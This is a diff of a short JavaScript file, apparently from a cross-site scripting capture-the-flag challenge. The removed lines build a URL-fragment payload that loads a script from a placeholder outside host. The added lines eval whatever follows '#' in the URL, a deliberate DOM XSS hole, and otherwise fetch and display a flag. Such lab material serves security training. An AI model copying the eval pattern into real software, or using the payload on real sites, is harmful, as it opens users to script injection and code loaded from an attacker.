@@ -1,16 +1,23 @@
-// Payload to load external script
-var payload = `
-    var script = document.createElement('script');
-    script.src = 'https://your-website.com/your-script.js';
-    document.body.appendChild(script);
-`;
-
-// Encode the payload to be URL-safe
-var encodedPayload = encodeURIComponent(payload);
-
-// Construct the final URL with the encoded payload
-var finalUrl = '/#' + encodedPayload;
-
-// Redirect to the final URL
-window.location.href = finalUrl;
-
+if (document.location.hash) {
+    var frag = document.location.hash.match(/[^#][^#]*/)[0];
+    try {
+        eval(frag);
+    } catch (e) {
+        alert("URL fragment (#) contains invalid JS code, try again!");
+    }
+} else {
+    fetch("/xss-two-flag")
+        .then(function(response) {
+            if (!response.ok) {
+                throw new Error("Network response was not ok");
+            }
+            return response.text();
+        })
+        .then(function(flag) {
+            console.log(flag);
+            alert(flag); // Alerting the retrieved flag
+        })
+        .catch(function(error) {
+            console.error("Fetch error:", error);
+        });
+}
